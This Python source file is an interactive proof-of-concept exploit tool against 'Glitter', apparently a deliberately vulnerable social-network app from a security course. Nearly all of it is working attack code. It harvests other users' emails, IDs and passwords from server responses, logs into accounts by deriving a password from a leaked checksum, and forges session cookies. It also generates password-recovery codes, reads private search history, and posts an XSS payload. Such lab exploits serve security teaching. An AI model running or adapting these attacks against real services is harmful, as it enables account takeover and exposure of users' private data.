import glitter

# global variables
username = ""
password = ""
user_id = ""
screen_name = ""
avatar = ""
description = ""
privacy = ""
gender = ""
mail = ""
app_sock = None


def get_user_id():
    """
    This function gets a user id from the user by searching for a user
    :return: the user id
    """
    # get the user screen name to search
    user_to_search = input("Enter the user screen name to search: ")

    # search for the user
    search_result = glitter.search_gliters_app(app_sock, 'SIMPLE', user_to_search)

    # simplify the search result
    search_result = glitter.simplify_data(search_result)

    # if the users was found let the user choose which user he wants to get his posts
    if search_result:
        for i in range(len(search_result)):
            print(str(i) + ". " + search_result[i]['screen_name'])

        # get the user choice and save the user id to temp_user_id
        temp_user_id = search_result[int(input("Enter the number of the user you choose: "))]['id']
        return temp_user_id
    else:
        print("No user found")
        return None


def get_post_id():
    """
    This function gets a post id from the user by searching for a user and then getting his posts
    :return: the post id
    """
    temp_user_id = ""

    # if the user doesn't want to get his own posts
    if (input("would you like to get you own posts?(y/n) ") != "y"):
        temp_user_id = get_user_id()
        if temp_user_id is None:
            return None
    else:
        temp_user_id = user_id

    # get the user posts
    load = glitter.load_data_app(app_sock, temp_user_id, 5)
    print(load)

    # simplify the response and print the posts
    glits = glitter.simplify_data(load)

    if glits is None:
        print("No glits found")
        return None

    print()
    for i in range(len(glits)):
        print(str(i) + ". \"" + glits[i]['content'] + "\" (" + glits[i]['date'][0:10] + ")")

    # get the user choice and return the post id
    return str(glits[int(input("Enter the number of the glit you choose: "))]['id'])


def show_search_result(search_result):
    """
    This function shows the search result
    :param search_result: the search result
    :return: None
    """
    # simplify the search result
    search_result = glitter.simplify_data(search_result)

    # if the users was found let the user choose which user he wants to get his posts
    if search_result:
        print(str(len(search_result)) + " users found")
        for i in range(len(search_result)):
            print(str(i) + ". " + search_result[i]['screen_name'])
    else:
        print("No user found")


def create_glit_and_like_it(temp_sock, temp_user_id, temp_screen_name, temp_avatar, contect):
    """
    This function creates a glit and then likes it
    :param temp_sock: the socket
    :param temp_user_id: the user id
    :param temp_screen_name: the user screen name
    :param temp_avatar: the user avatar
    :param contect: the glit content
    :return: the like id
    """
    msg = glitter.post_glit_app(temp_sock, temp_user_id, temp_user_id, temp_screen_name, temp_avatar, "white",
                                glitter.get_current_time_post_format(), contect, "black")
    print("now let's like that glit")
    temp_glit_id = glitter.get_value_from_response(msg, "id")
    like_res = glitter.like_glit_app(temp_sock, temp_glit_id, temp_user_id, temp_screen_name)
    temp_like_id = glitter.get_value_from_response(like_res, "id")
    return temp_like_id


def get_username_from_id(wanted_user_id):
    """
    This function gets a username from a user id
    :param wanted_user_id: the user id
    :return: the username
    """
    res, status = glitter.change_user_info_app(app_sock, screen_name, avatar, description, privacy, wanted_user_id,
                                               username, password, gender, mail, False)
    if (status == glitter.FAILURE):
        wanted_username = res[res.find("username: ") + len("username: "):res.find("{")]
        return wanted_username
    else:
        return None


def print_main_menu():
    """
    This function prints the menu
    :return: None
    """
    print()
    print("Please choose one of the following options:")
    print("1. comment a glit prove of concepts")
    print("2. like a glit prove of concepts")
    print("3. dislike a glit prove of concepts")
    print("4. post a glit prove of concepts")
    print("5. search a glit prove of concepts")
    print("6. change user info prove of concepts")
    print("7. challenges")
    print("8. exit")


def print_comment_menu():
    """
    This function prints the comment menu
    :return: the user choice
    """
    print("Please choose one of the following options:")
    print("1. comment a glit with a different time")
    print("2. comment a nonexistent gilt")
    print("3. comment a glit that is private")
    print("4. exit")


def print_dislike_menu():
    """
    This function prints the dislike menu
    :return: the user choice
    """
    print("Please choose one of the following options:")
    print("1. dislike a glit of a private user")
    print("2. dislike a glit that is not yours")
    print("3. exit")


def print_like_menu():
    """
    This function prints the like menu
    :return: the user choice
    """
    print("Please choose one of the following options:")
    print("1. give yourself a like infinite likes(the default is 3 change the constant NUM_OF_LIKES)")
    print("2. like a nonexistent glit")
    print("3. exit")


def print_post_menu():
    """
    This function prints the post menu
    :return: the user choice
    """
    print("Please choose one of the following options:")
    print("1. post a glit with a different time")
    print("2. post a glit with a different avatar")
    print("3. post a glit with a nonexistent background color")
    print("4. post a glit with a nonexistent text color")
    print("5. post a glit with a cross site scripting")
    print("6. exit")


def print_search_menu():
    """
    This function prints the search menu
    :return: the user choice
    """
    print("Please choose one of the following options:")
    print("1. get ID's and emails of search results")
    print("2. get info of the first 5 ID's of")
    print("3. exit")


def print_change_user_info_menu():
    """
    This function prints the change info menu
    :return: the user choice
    """
    print("Please choose one of the following options:")
    print("1. show username and password from server response")
    print("2. show username with user id")
    print("3. exit")


def print_challenges_menu():
    """
    This function prints the challenges menu
    :return: the user choice
    """
    print("Please choose one of the following options:")
    print("1. the login challenge")
    print("2. the cookie challenge")
    print("3. the password challenge")
    print("4. the XXS challenge")
    print("5. the privacy challenge")
    print("6. exit")


def print_right_menu(user_choice_kind):
    """
    This function prints the right menu according to the user kind choice and call the right function
    :param user_choice_kind: the user choice
    :return: the user choice
    """
    print("\n")
    user_choice = ""
    if (user_choice_kind == "1"):
        print_comment_menu()
        user_choice = input("Enter your choice: ")
        comment_glit_prove_of_concepts(user_choice)
    elif (user_choice_kind == "2"):
        print_like_menu()
        user_choice = input("Enter your choice: ")
        like_glit_prove_of_concepts(user_choice)
    elif (user_choice_kind == "3"):
        print_dislike_menu()
        user_choice = input("Enter your choice: ")
        dislike_glit_prove_of_concepts(user_choice)
    elif (user_choice_kind == "4"):
        print_post_menu()
        user_choice = input("Enter your choice: ")
        post_glit_prove_of_concepts(user_choice)
    elif (user_choice_kind == "5"):
        print_search_menu()
        user_choice = input("Enter your choice: ")
        search_glit_prove_of_concepts(user_choice)
    elif (user_choice_kind == "6"):
        print_change_user_info_menu()
        user_choice = input("Enter your choice: ")
        change_user_info_prove_of_concepts(user_choice)
    elif (user_choice_kind == "7"):
        print_challenges_menu()
        user_choice = input("Enter your choice: ")
        challenges_prove_of_concepts(user_choice)
    elif (user_choice_kind == "8"):
        return
    else:
        print("wrong choice")
        return -1


def welcome_and_get_login_info():
    """
    This function prints the welcome message and get the login info from the user
    :return: None
    """
    global username, password
    print("Welcome to the prove of concept for glit")
    print("Before we start, please enter your username and password")
    username = input("Username: ")
    password = input("Password: ")


def login_to_temp_user():
    """
    This function login to a temp user
    :return: None
    """
    temp_sock = glitter.initialize_app_connection()
    temp_username = input("Username: ")
    temp_password = input("Password: ")
    temp_user_info = glitter.app_login(temp_sock, temp_username, temp_password)
    return temp_sock, temp_user_info[0], temp_user_info[1], temp_user_info[2]


def comment_glit_prove_of_concepts(user_choice):
    """
    this function run the comment prove of concepts
    :return: None
    """
    if (user_choice == "1"):
        # This is a POC for commenting a glit with a time that is not the current time

        # get the post id
        post_id = get_post_id()
        if post_id is None:
            return  # if the user entered an invalid post id return to the main menu

        # send the comment
        glitter.comment_glit_app(app_sock, post_id, user_id, screen_name,
                                 ('now its ' + glitter.get_current_time_regular_format()), glitter.TIME_SEND_EXAMPLE)
    elif (user_choice == "2"):
        # this is a POC for commenting to a gilt with an id that does not exist, it won't throw an error but instead
        # create a new glit with the content of the comment and pink background color in the feed of the user that
        # commented last
        glitter.comment_glit_app(app_sock, glitter.NONEXISTENT_ID, user_id, screen_name,
                                 'this is a comment to a nonexistent glit', glitter.get_current_time_post_format())
    elif (user_choice == "3"):
        # this is a POC for commenting to a private glit

        # get the post id
        post_id = get_post_id()
        if post_id is None:
            return  # if the user entered an invalid post id return to the main menu

        # send the comment
        glitter.comment_glit_app(app_sock, post_id, user_id, screen_name,
                                 "this is a comment to a private glit", glitter.get_current_time_post_format())
    elif (user_choice == "4"):
        return


def like_glit_prove_of_concepts(user_choice):
    """
    this function run the like prove of concepts
    :return: None
    """
    if (user_choice == "1"):
        # This is a POC that show that you can get as many likes as you want simply by sending repeated like requests
        post_id = get_post_id()
        for i in range(glitter.NUM_OF_LIKES):
            glitter.like_glit_app(app_sock, post_id, user_id, screen_name)
    elif (user_choice == "2"):
        # This is a POC that show that you can like a glit that does not exist,
        # and it will not throw an error but create a new glit with empty content and pink color
        glitter.like_glit_app(app_sock, glitter.NONEXISTENT_ID, user_id, screen_name)
    elif (user_choice == "3"):
        return


def dislike_glit_prove_of_concepts(user_choice):
    """
    this function run the dislike prove of concepts
    :return: None
    """
    if (user_choice == "1"):
        # This is a POC that show that you can dislike a private glit
        print("let's dislike a private glit by connecting to a different user that is private")
        try:
            temp_sock, temp_user_id, temp_screen_name, temp_avatar = login_to_temp_user()
        except Exception as e:
            return
        print("now let's create a private glit")
        temp_like_id = create_glit_and_like_it(temp_sock, temp_user_id, temp_screen_name, temp_avatar,
                                               "this is a private glit")
        input("make sure that the post and the like are successful \npress enter to continue")
        print("now let's log out from the temp user")
        glitter.logout_app(temp_sock, temp_user_id)
        print("now let's dislike the private glit from the main user")
        glitter.dislike_glit_app(app_sock, temp_like_id)

    elif (user_choice == "2"):
        # This is a POC that show that you can dislike a glit that is not yours
        print("let's dislike a glit that is not ours by connecting to a different user")
        try:
            temp_sock, temp_user_id, temp_screen_name, temp_avatar = login_to_temp_user()
        except Exception as e:
            return
        print("now let's create a glit")
        temp_like_id = create_glit_and_like_it(temp_sock, temp_user_id, temp_screen_name, temp_avatar, "this is a glit")
        input("make sure that the post and the like are successful \npress enter to continue")
        print("now let's log out from the temp user")
        glitter.logout_app(temp_sock, temp_user_id)
        print("now let's dislike the glit from the main user")
        glitter.dislike_glit_app(app_sock, temp_like_id)
    elif (user_choice == "3"):
        return


def post_glit_prove_of_concepts(user_choice):
    """
    this function run the post prove of concepts
    :return: None
    """
    if (user_choice == "1"):
        # This is a POC that show that you can post a glit with a time that is not the current time
        glitter.post_glit_app(app_sock, user_id, user_id, screen_name, avatar, '', glitter.TIME_SEND_EXAMPLE,
                              ('now its ' + glitter.get_current_time_regular_format()), 'black')
    elif (user_choice == "2"):
        # This is a POC that show that you can post a glit with a different image as an avatar
        glitter.post_glit_app(app_sock, user_id, user_id, screen_name, 'im5', 'white',
                              glitter.get_current_time_post_format(), 'new picture!!!', 'black')
    elif (user_choice == "3"):
        # This is a POC that show that you can post a glit with a nonexistent background color
        bg_color = input("Enter a color in HEX or just in text for background color: ")
        glitter.post_glit_app(app_sock, user_id, user_id, screen_name, avatar, bg_color,
                              glitter.get_current_time_post_format(), 'new background color!!!', 'White')
    elif (user_choice == "4"):
        # This is a POC that show that you can post a glit with a nonexistent text color
        text_color = input("Enter a color in HEX or just in text for text color: ")
        glitter.post_glit_app(app_sock, user_id, user_id, screen_name, avatar, 'White',
                              glitter.get_current_time_post_format(), 'new text color!!!', text_color)
    elif (user_choice == "5"):
        # This is a POC that show that you can post a glit with XSS
        glitter.post_glit_app(app_sock, user_id, user_id, screen_name, avatar, 'White',
                              glitter.get_current_time_post_format(), glitter.XSS_EXAMPLE, 'black')


def search_glit_prove_of_concepts(user_choice):
    """
    this function run the search prove of concepts
    :return: None
    """
    if (user_choice == "1"):
        # This is a POC that show that you can search for a user, and it will show us the id and the email of the user
        search_prompt = input("Enter a user screen name to search: ")
        search_result = glitter.search_gliters_app(app_sock, 'SIMPLE', search_prompt)
        show_search_result(search_result)

    elif (user_choice == "2"):
        # This is a POC for searching for nothing and getting user ids and emails of the first 5 users
        search_result = glitter.search_gliters_app(app_sock, 'SIMPLE', '')
        show_search_result(search_result)

    else:
        return


def change_user_info_prove_of_concepts(user_choice):
    """
    this function run the change user info prove of concepts
    :return: None
    """
    if (user_choice == "1"):
        # This is a POC that show that the sever return the username and the password of the user

        # get the user info
        res, status = glitter.change_user_info_app(app_sock, screen_name, avatar, description, privacy, user_id,
                                                   username, password, gender, mail)

        # check if the request was successful print the username and the password of the user from the sever response
        if (status == glitter.SUCCESS):
            print("\nthis are the username and the password form the sever!")
            print("username: " + glitter.get_value_from_response(res, "user_name"))
            print("password: " + glitter.get_value_from_response(res, "password") + '\n')
    elif (user_choice == "2"):
        # This is a POC that show that you can send a request to change the user info with a wrong existing id,
        # and you will get the username of that id

        print("lets get the username of a user")
        wanted_user_id = get_user_id()

        # get the username
        wanted_username = get_username_from_id(wanted_user_id)
        print("the username of the user is: " + wanted_username)

    elif (user_choice == "3"):
        return


def challenges_prove_of_concepts(user_choice):
    if (user_choice == "1"):
        # ask the user if he wants to know about the login challenge
        if (input("do you want to know about the login challenge? (y/n): ") == "y"):
            help(login_challenge)
        # the login challenge is to log in to a user without knowing the password
        login_challenge()
    elif (user_choice == "2"):
        # ask the user if he wants to know about the cookie challenge
        if (input("do you want to know about the cookie challenge? (y/n): ") == "y"):
            help(cookie_challenge)
        # the cookie challenge is to acquire the cookie of a user without logging in to his account
        cookie_challenge()
    elif (user_choice == "3"):
        # ask the user if he wants to know about the password challenge
        if (input("do you want to know about the password challenge? (y/n): ") == "y"):
            help(password_challenge)
        # the password challenge is to get the password of a user without knowing the password
        password_challenge()
    elif (user_choice == "4"):
        # ask the user if he wants to know about the privacy challenge
        if (input("do you want to know about the privecy challenge? (y/n): ") == "y"):
            help(privacy_challenge)
        # the privacy challenge is to get information about a user that is private and only the user can see it
        privacy_challenge()


def login_challenge():
    """
    this function run the login challenge
    the login challenge is to log in to a user without knowing the password
    it works because the glitter software chack the checksum of the password and not the password itself
    by logging with a false password the server will expose the checksum of the password and the username combined
    by subtracting the checksum of the username from the checksum of the password and the username combined
    we get the checksum of the password, then we can create a string with the ascii sum of the checksum of the password,
    and then we are in the account without knowing the password
    by combining this falty with the change user info POC we can get the username with the user id
    witch we can get with the search
    :return: None
    """
    wanted_user_id = get_user_id()
    if wanted_user_id is None:
        return

    # get the username
    wanted_username = get_username_from_id(wanted_user_id)

    # create a connection to the server
    temp_connection = glitter.initialize_app_connection()

    # login with a false password to get the checksum of the password and the username combined
    error_msg = glitter.app_login(temp_connection, wanted_username, "pass", False)

    # get the checksum of the password and the username combined
    chacksum = error_msg[error_msg.find("checksum: ") + 10:error_msg.find("{")]

    # calculate the checksum of the password
    password_checksum = int(chacksum) - glitter.ascii_checksum(wanted_username)
    print("the checksum of the password and the username combined is: " + chacksum)
    print("the checksum of the username is: " + str(glitter.ascii_checksum(wanted_username)))
    print("the checksum of the password is: " + str(password_checksum))

    # create a string with the ascii sum of the checksum of the password
    password_str = glitter.create_a_string_with_ascii_sum(password_checksum)
    print("username: " + wanted_username)
    print("the password is: " + password_str)

    # login with the password
    tap = glitter.app_login(temp_connection, wanted_username, password_str)
    glitter.logout_app(temp_connection, tap[0])
    temp_connection.close()


def cookie_challenge():
    """
    this function run the cookie challenge
    the cookie challenge is to acquire the cookie of a user without logging in to his account
    there are 2 was to do it:
    1. by reverse engineering the cookie itself and create a cookie
        with the same data(the date and time of the cookie and the username).
    2. by sending a friend request to the user and get the cookie from the server response.
    :return: None
    """
    # let the user choose a way to get the cookie
    print("Choose a way to get the cookie:")
    print("1. by reverse engineering the cookie itself and create a cookie with the date and time of the cookie")
    print("2. by sending a friend request to the user and get the cookie from the server response")
    user_choice = input("Your choice: ")
    if (user_choice == "1"):
        # get the date, time and the username of the cookie
        date = input("enter the date of the cookie (dd/mm/yyyy): ")
        time = input("enter the time of the cookie (hh:mm): ")

        # if he knows the username of the user there in need to search for the username
        if input("do you know the username of the user? (y/n): ") == "y":
            cookie_username = input("enter the username of the user: ")
        else:
            wanted_user_id = get_user_id()
            if wanted_user_id is None:
                return
            cookie_username = get_username_from_id(wanted_user_id)

        # create the cookie and print it
        cookie = glitter.create_cookie(date, time, cookie_username)
        print("the cookie is: " + cookie)
        return
    elif (user_choice == "2"):
        # get the user id of the user to send the friend request to
        user_id_to_send = get_user_id()
        if user_id_to_send is None:
            return

        # refuse the glance request in case the user is already sent a glance request to the user
        glitter.refuse_glance_request_app(app_sock, user_id, user_id_to_send)

        # send a glance request to the user
        cookie = glitter.send_glance_request_app(app_sock, user_id, user_id_to_send)

        # if there is a problem with the request
        if cookie is None:
            return

        # get the cookie from the server response
        cookie = cookie[cookie.find("session: ") + 9:cookie.find("{")]

        # if the user is not logged on the website then print that he is not logged on the website instead of the cookie
        if cookie == ("USER_NOT_LOGGED_ON_WEBSITE"):
            print("the user is not logged on the website")
            return

        # if all is good print the cookie
        print("the cookie is: " + cookie)


def password_challenge():
    """
    this function run the password challenge
    the password challenge is to get the password of the username without knowing the anything about the user
    it works because the glitter doesn't let you change the password but show you the password.
    the password is the recovery program sends an email to the user with a code and then the code reveals the password
    but the code can be made by the knowing the userid
    so if you have the code you can get the password,
    so we send a recovery email to the user, but we don't have access to the email, but we can create a recovery code with
    the userid, and then we can reveal the password abd get it
    :return: None
    """
    wanted_user_id = get_user_id()
    if wanted_user_id is None:
        return
    password_username = get_username_from_id(wanted_user_id)
    mail_sent = glitter.request_password_recovery_web(password_username)
    if mail_sent:
        print("the mail was sent to the user")
        recovery_code = glitter.generate_key(glitter.get_current_date(), wanted_user_id, glitter.get_current_time())
        print("the recovery code is: " + recovery_code)
        print("the password is: " + glitter.get_password_from_recovery_code(password_username, recovery_code))


def privacy_challenge():
    """
    this function run the privacy challenge

    :return:
    """
    # ask the user if he wants to see the user search history or the user glance requests
    print("Choose which private information you want to see:")
    print("1. user search history")
    print("2. user glance requests")
    user_choice = input("Your choice: ")
    if user_choice == "1":
        # get the user id of the user to see his search history
        wanted_user_id = get_user_id()
        if wanted_user_id is None:
            return

        # get the search history of the user
        search_history = glitter.get_user_search_history_app(app_sock, wanted_user_id)

        # if there is a problem with the request
        if search_history is None:
            return

        # simplify the data
        simple_search_history = glitter.simplify_data(search_history)

        # if there is a search history print it
        if simple_search_history:
            print("the user search for: ")
            for search in simple_search_history:
                print(search["screen_name"])
            return

        # if there is no search history print that there is no search history
        print("the user didn't search for anything")
        return
    elif (user_choice == "2"):
        # get the user id of the user to see his glance requests
        wanted_user_id = get_user_id()
        if wanted_user_id is None:
            return

        # get the glance requests of the user
        glance_requests = glitter.get_user_updates_app(app_sock, wanted_user_id)

        # if there is a problem with the request
        if glance_requests is None:
            return

        # simplify the data
        simple_glance_requests = glitter.simplify_data(glance_requests)

        # if there is a glance requests print it
        if simple_glance_requests:
            print("the user got glance requests from: ")
            for glance_request in simple_glance_requests:
                print(glance_request["initiator"]["screen_name"])
            return

        # if there is no glance requests print that there is no glance requests
        print("the user didn't get any glance requests")
        return



def main():
    # define the global variables
    global app_sock, user_id, screen_name, avatar, description, privacy, gender, mail

    welcome_and_get_login_info()
    app_sock = glitter.initialize_app_connection()
    try:
        user_id, screen_name, avatar, description, privacy, gender, mail = glitter.app_login(app_sock, username,
                                                                                             password)
    except Exception as e:
        return

    user_choice_kind = ""
    while (user_choice_kind != "8"):
        print_main_menu()
        user_choice_kind = input("Your choice: ")
        print_right_menu(user_choice_kind)
        # print press enter to continue in light gray
        input("\033[90m" + "\npress enter to continue" + "\033[0m")
    glitter.logout_app(app_sock, user_id)


if __name__ == '__main__':
    main()
